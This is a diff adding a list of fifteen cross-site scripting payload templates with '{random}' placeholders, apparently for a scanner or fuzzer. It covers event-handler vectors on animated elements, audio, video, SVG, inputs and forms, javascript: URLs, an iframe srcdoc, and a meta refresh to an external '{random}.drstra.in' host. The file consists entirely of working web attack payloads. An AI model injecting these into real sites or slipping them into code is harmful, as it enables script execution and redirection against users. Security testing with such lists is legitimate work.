@@ -1,0 +1,15 @@
+{random}<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="console.log('{random}')"></xss>{random}
+{random}<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="console.log('{random}')"></xss>{random}
+{random}<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="console.log(1)"></xss>{random}
+{random}<audio oncanplay=console.log(1)><source src="validaudio.wav" type="audio/wav"></audio>{random}
+{random}<video oncanplaythrough=console.log(1)><source src="validvideo.mp4" type="video/mp4"></video>{random}
+{random}<svg><animate onend=console.log(1) attributeName=x dur=1s>{random}
+{random}<audio src/onerror=console.log(1)>{random}
+{random}<svg onload=console.log(1)>{random}
+{random}<svg><animate onrepeat=console.log(1) attributeName=x dur=1s repeatCount=2 />{random}
+{random}<audio controls autoplay ontimeupdate=console.log(1)><source src="validaudio.wav" type="audio/wav"></audio>
+{random}<input oninput=console.log(1) value=xss>{random}
+{random}<form><button formaction=javascript:console.log(1)>XSS{random}
+{random}<a href="javascript://%0aalert(1)">XSS</a>{random}
+{random}<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>{random}
+{random}<meta http-equiv="refresh" content="0; url=//{random}.drstra.in">
